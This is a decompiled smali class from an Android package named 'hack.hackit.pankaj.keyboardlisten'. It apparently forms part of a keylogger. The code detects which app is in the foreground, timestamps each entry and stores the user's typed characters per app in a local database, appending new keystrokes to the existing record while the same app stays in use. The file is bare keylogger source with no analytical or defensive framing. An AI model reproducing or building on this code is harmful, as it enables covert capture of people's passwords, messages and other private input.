.class public Lhack/hackit/pankaj/keyboardlisten/Driver;
.super Ljava/lang/Object;
.source "Driver.java"


# static fields
.field private static context:Landroid/content/Context;

.field public static mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;


# instance fields
.field private table_name:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 24
    const/4 v0, 0x0

    sput-object v0, Lhack/hackit/pankaj/keyboardlisten/Driver;->mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 22
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 25
    const-string v0, "All"

    iput-object v0, p0, Lhack/hackit/pankaj/keyboardlisten/Driver;->table_name:Ljava/lang/String;

    return-void
.end method

.method public static getActivePackages1()Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;
    .locals 13

    .prologue
    .line 69
    invoke-static {}, Lhack/hackit/pankaj/keyboardlisten/HKApplication;->getAppContext()Landroid/content/Context;

    move-result-object v10

    sput-object v10, Lhack/hackit/pankaj/keyboardlisten/Driver;->context:Landroid/content/Context;

    .line 70
    const-string v4, ""

    .line 71
    .local v4, "currentAppName":Ljava/lang/String;
    const-string v5, ""

    .line 72
    .local v5, "currentAppPackage":Ljava/lang/String;
    new-instance v0, Ljava/util/HashSet;

    invoke-direct {v0}, Ljava/util/HashSet;-><init>()V

    .line 73
    .local v0, "activePackages":Ljava/util/Set;, "Ljava/util/Set<Ljava/lang/String;>;"
    sget-object v10, Lhack/hackit/pankaj/keyboardlisten/Driver;->context:Landroid/content/Context;

    invoke-virtual {v10}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v7

    .line 74
    .local v7, "pm":Landroid/content/pm/PackageManager;
    sget-object v10, Lhack/hackit/pankaj/keyboardlisten/Driver;->context:Landroid/content/Context;

    sget-object v11, Lhack/hackit/pankaj/keyboardlisten/Driver;->context:Landroid/content/Context;

    const-string v11, "activity"

    invoke-virtual {v10, v11}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager;

    .line 75
    .local v1, "am":Landroid/app/ActivityManager;
    invoke-virtual {v1}, Landroid/app/ActivityManager;->getRunningAppProcesses()Ljava/util/List;

    move-result-object v9

    .line 76
    .local v9, "processInfos":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningAppProcessInfo;>;"
    invoke-interface {v9}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v10

    :cond_0
    :goto_0
    invoke-interface {v10}, Ljava/util/Iterator;->hasNext()Z

    move-result v11

    if-eqz v11, :cond_1

    invoke-interface {v10}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/app/ActivityManager$RunningAppProcessInfo;

    .line 78
    .local v8, "processInfo":Landroid/app/ActivityManager$RunningAppProcessInfo;
    :try_start_0
    iget-object v11, v8, Landroid/app/ActivityManager$RunningAppProcessInfo;->processName:Ljava/lang/String;

    const/16 v12, 0x80

    invoke-virtual {v7, v11, v12}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v11

    invoke-virtual {v7, v11}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v3

    .line 79
    .local v3, "c":Ljava/lang/CharSequence;
    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v6

    .line 80
    .local v6, "op":Ljava/lang/String;
    const-string v11, "System UI"

    invoke-virtual {v6, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_0

    const-string v11, "Android System"

    invoke-virtual {v6, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_0

    const-string v11, "LocationServices"

    invoke-virtual {v6, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_0

    const-string v11, "Phone"

    invoke-virtual {v6, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_0

    const-string v11, "Bluetooth"

    invoke-virtual {v6, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_0

    iget v11, v8, Landroid/app/ActivityManager$RunningAppProcessInfo;->importance:I

    const/16 v12, 0x64

    if-ne v11, v12, :cond_0

    .line 82
    iget-object v5, v8, Landroid/app/ActivityManager$RunningAppProcessInfo;->processName:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 83
    move-object v4, v6

    .line 90
    .end local v3    # "c":Ljava/lang/CharSequence;
    .end local v6    # "op":Ljava/lang/String;
    .end local v8    # "processInfo":Landroid/app/ActivityManager$RunningAppProcessInfo;
    :cond_1
    new-instance v2, Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;

    invoke-direct {v2, v4, v5}, Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 91
    .local v2, "api":Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;
    return-object v2

    .line 87
    .end local v2    # "api":Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;
    .restart local v8    # "processInfo":Landroid/app/ActivityManager$RunningAppProcessInfo;
    :catch_0
    move-exception v11

    goto :goto_0
.end method

.method public static getCurrentAppName()Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;
    .locals 4

    .prologue
    .line 52
    new-instance v2, Lhack/hackit/pankaj/keyboardlisten/Driver;

    invoke-direct {v2}, Lhack/hackit/pankaj/keyboardlisten/Driver;-><init>()V

    .line 54
    .local v2, "ma":Lhack/hackit/pankaj/keyboardlisten/Driver;
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 55
    .local v1, "currentVersion":I
    const/16 v3, 0x15

    if-lt v1, v3, :cond_0

    .line 57
    invoke-static {}, Lhack/hackit/pankaj/keyboardlisten/Driver;->getActivePackages1()Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;

    move-result-object v0

    .line 63
    .local v0, "appname":Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;
    :goto_0
    return-object v0

    .line 61
    .end local v0    # "appname":Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;
    :cond_0
    invoke-virtual {v2}, Lhack/hackit/pankaj/keyboardlisten/Driver;->getActivePackages()Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;

    move-result-object v0

    .restart local v0    # "appname":Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;
    goto :goto_0
.end method

.method public static mycurrentTime()Ljava/lang/String;
    .locals 5

    .prologue
    .line 157
    invoke-static {}, Ljava/util/TimeZone;->getDefault()Ljava/util/TimeZone;

    move-result-object v4

    invoke-static {v4}, Ljava/util/Calendar;->getInstance(Ljava/util/TimeZone;)Ljava/util/Calendar;

    move-result-object v0

    .line 158
    .local v0, "cal":Ljava/util/Calendar;
    invoke-virtual {v0}, Ljava/util/Calendar;->getTime()Ljava/util/Date;

    move-result-object v1

    .line 159
    .local v1, "currentLocalTime":Ljava/util/Date;
    new-instance v2, Ljava/text/SimpleDateFormat;

    const-string v4, "dd-MM-yyyy HH:mm a"

    invoke-direct {v2, v4}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 161
    .local v2, "date":Ljava/text/DateFormat;
    invoke-static {}, Ljava/util/TimeZone;->getDefault()Ljava/util/TimeZone;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/text/DateFormat;->setTimeZone(Ljava/util/TimeZone;)V

    .line 162
    invoke-virtual {v2, v1}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v3

    .line 163
    .local v3, "localTime":Ljava/lang/String;
    const-string v4, "time"

    invoke-static {v4, v3}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 164
    return-object v3
.end method


# virtual methods
.method public getActivePackages()Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;
    .locals 11

    .prologue
    .line 97
    invoke-static {}, Lhack/hackit/pankaj/keyboardlisten/HKApplication;->getAppContext()Landroid/content/Context;

    move-result-object v9

    sput-object v9, Lhack/hackit/pankaj/keyboardlisten/Driver;->context:Landroid/content/Context;

    .line 98
    const-string v6, ""

    .line 99
    .local v6, "foregroundTaskPackageName":Ljava/lang/String;
    const-string v2, ""

    .line 104
    .local v2, "appname":Ljava/lang/String;
    :try_start_0
    sget-object v9, Lhack/hackit/pankaj/keyboardlisten/Driver;->context:Landroid/content/Context;

    sget-object v10, Lhack/hackit/pankaj/keyboardlisten/Driver;->context:Landroid/content/Context;

    const-string v10, "activity"

    invoke-virtual {v9, v10}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/app/ActivityManager;

    .line 105
    .local v7, "mActivityManager":Landroid/app/ActivityManager;
    const/4 v9, 0x1

    invoke-virtual {v7, v9}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v0

    .line 106
    .local v0, "RunningTask":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    const/4 v9, 0x0

    invoke-interface {v0, v9}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/ActivityManager$RunningTaskInfo;

    .line 107
    .local v3, "ar":Landroid/app/ActivityManager$RunningTaskInfo;
    iget-object v9, v3, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    invoke-virtual {v9}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v6

    .line 109
    sget-object v9, Lhack/hackit/pankaj/keyboardlisten/Driver;->context:Landroid/content/Context;

    invoke-virtual {v9}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v8

    .line 110
    .local v8, "pm":Landroid/content/pm/PackageManager;
    const/4 v9, 0x0

    invoke-virtual {v8, v6, v9}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v4

    .line 111
    .local v4, "foregroundAppPackageInfo":Landroid/content/pm/PackageInfo;
    iget-object v9, v4, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    invoke-virtual {v9, v8}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v9

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v5

    .line 112
    .local v5, "foregroundTaskAppName":Ljava/lang/String;
    move-object v2, v5

    .line 117
    .end local v0    # "RunningTask":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    .end local v3    # "ar":Landroid/app/ActivityManager$RunningTaskInfo;
    .end local v4    # "foregroundAppPackageInfo":Landroid/content/pm/PackageInfo;
    .end local v5    # "foregroundTaskAppName":Ljava/lang/String;
    .end local v7    # "mActivityManager":Landroid/app/ActivityManager;
    .end local v8    # "pm":Landroid/content/pm/PackageManager;
    :goto_0
    new-instance v1, Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;

    invoke-direct {v1, v2, v6}, Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 118
    .local v1, "api":Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;
    return-object v1

    .line 113
    .end local v1    # "api":Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;
    :catch_0
    move-exception v9

    goto :goto_0
.end method

.method public makeAnObject(Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;Ljava/lang/String;)V
    .locals 11
    .param p1, "appInfo"    # Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;
    .param p2, "s_char"    # Ljava/lang/String;

    .prologue
    .line 124
    invoke-virtual {p1}, Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;->getApp_name()Ljava/lang/String;

    move-result-object v0

    .line 125
    .local v0, "appName":Ljava/lang/String;
    invoke-virtual {p1}, Lhack/hackit/pankaj/keyboardlisten/AppPackageInfo;->getApp_package_name()Ljava/lang/String;

    move-result-object v5

    .line 127
    .local v5, "packageName":Ljava/lang/String;
    new-instance v6, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    sget-object v7, Lhack/hackit/pankaj/keyboardlisten/Driver;->context:Landroid/content/Context;

    invoke-direct {v6, v7}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;-><init>(Landroid/content/Context;)V

    sput-object v6, Lhack/hackit/pankaj/keyboardlisten/Driver;->mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    .line 128
    invoke-static {}, Lhack/hackit/pankaj/keyboardlisten/Driver;->mycurrentTime()Ljava/lang/String;

    move-result-object v4

    .line 131
    .local v4, "now":Ljava/lang/String;
    sget-object v6, Lhack/hackit/pankaj/keyboardlisten/Driver;->mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    iget-object v7, p0, Lhack/hackit/pankaj/keyboardlisten/Driver;->table_name:Ljava/lang/String;

    invoke-virtual {v6, v7}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->getRowCount(Ljava/lang/String;)I

    move-result v6

    if-nez v6, :cond_0

    .line 133
    new-instance v1, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;

    invoke-direct {v1, v0, v4, p2, v5}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 134
    .local v1, "kvd":Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    sget-object v6, Lhack/hackit/pankaj/keyboardlisten/Driver;->mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    iget-object v7, p0, Lhack/hackit/pankaj/keyboardlisten/Driver;->table_name:Ljava/lang/String;

    invoke-virtual {v6, v1, v7}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->insertRecord(Lhack/hackit/pankaj/keyboardlisten/KeyEventData;Ljava/lang/String;)Ljava/lang/String;

    .line 151
    .end local v1    # "kvd":Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    :goto_0
    const/4 v6, 0x0

    sput-object v6, Lhack/hackit/pankaj/keyboardlisten/Driver;->mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    .line 153
    return-void

    .line 138
    :cond_0
    sget-object v6, Lhack/hackit/pankaj/keyboardlisten/Driver;->mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    iget-object v7, p0, Lhack/hackit/pankaj/keyboardlisten/Driver;->table_name:Ljava/lang/String;

    invoke-virtual {v6, v7}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->getLastRecord(Ljava/lang/String;)Lhack/hackit/pankaj/keyboardlisten/KeyEventData;

    move-result-object v3

    .line 139
    .local v3, "lastObject":Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    invoke-virtual {v3}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->get_ApplicationName()Ljava/lang/String;

    move-result-object v2

    .line 140
    .local v2, "lastApp":Ljava/lang/String;
    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1

    .line 142
    sget-object v6, Lhack/hackit/pankaj/keyboardlisten/Driver;->mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    invoke-virtual {v3}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->get_SrNo()J

    move-result-wide v8

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->get_TypedText()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v8, v9, v4, v7}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->updateData(JLjava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 146
    :cond_1
    new-instance v1, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;

    invoke-direct {v1, v0, v4, p2, v5}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 147
    .restart local v1    # "kvd":Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    sget-object v6, Lhack/hackit/pankaj/keyboardlisten/Driver;->mdh:Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;

    iget-object v7, p0, Lhack/hackit/pankaj/keyboardlisten/Driver;->table_name:Ljava/lang/String;

    invoke-virtual {v6, v1, v7}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->insertRecord(Lhack/hackit/pankaj/keyboardlisten/KeyEventData;Ljava/lang/String;)Ljava/lang/String;

    goto :goto_0
.end method
